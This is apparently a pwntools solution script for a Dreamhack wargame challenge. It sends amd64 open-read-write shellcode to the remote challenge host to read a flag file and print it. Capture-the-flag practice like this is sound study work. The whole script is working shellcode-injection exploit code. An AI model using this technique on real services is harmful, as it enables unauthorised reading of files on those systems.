from pwn import *
# p = process('./shell_basic')
p = remote('host3.dreamhack.games', 16805)
context.arch = 'amd64'
#sys_open('/home/shell_basic/flag_name_is_loooooong', 0, 0)
shellcode = shellcraft.open('/home/shell_basic/flag_name_is_loooooong', 0, 0)
shellcode += shellcraft.read('rax', 'rsp', 0x100)
shellcode += shellcraft.write('1', 'rsp', 0x100)
print(shellcode)
p.sendline(bytes(asm(shellcode)))
p.interactive()
